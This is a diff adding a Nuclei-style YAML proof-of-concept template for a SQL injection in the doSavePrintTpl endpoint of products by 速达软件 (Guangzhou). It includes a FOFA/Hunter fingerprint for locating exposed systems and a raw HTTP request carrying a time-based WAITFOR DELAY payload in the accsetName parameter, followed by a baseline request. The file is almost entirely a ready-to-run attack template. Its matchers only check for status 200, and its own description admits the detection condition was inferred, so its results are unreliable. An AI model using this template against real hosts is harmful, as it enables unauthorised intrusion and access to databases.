@@ -1,0 +1,60 @@
+id: poc-7c00c87a4a389c0d987a
+info:
+  name: 速达软件技术（广州）有限公司多款产品doSavePrintTpl存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7c00c87a4a389c0d987a062e4b376c0a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7c00c87a4a389c0d987a062e4b376c0a
+    fofa: + hunter`web.body="速达软件技术（广州）有限公司"`
+http:
+- raw:
+  - 'GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1&modId=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: JSESSIONID=95EE3D005EFC17F6D1246339EA7617CB
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
